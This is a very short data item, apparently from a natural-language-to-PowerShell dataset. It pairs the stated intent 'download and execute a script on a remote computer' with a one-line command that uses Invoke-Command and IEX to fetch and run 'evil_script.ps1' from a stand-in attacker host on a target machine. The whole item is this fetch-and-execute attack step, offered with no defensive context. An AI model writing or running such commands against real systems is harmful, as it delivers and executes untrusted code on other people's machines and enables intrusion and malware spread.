# Natural language intent:
# Run a PowerShell script block on a remote computer to download and execute a script.

Invoke-Command -ComputerName <remotehost> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://villain_server/evil_script.ps1')}
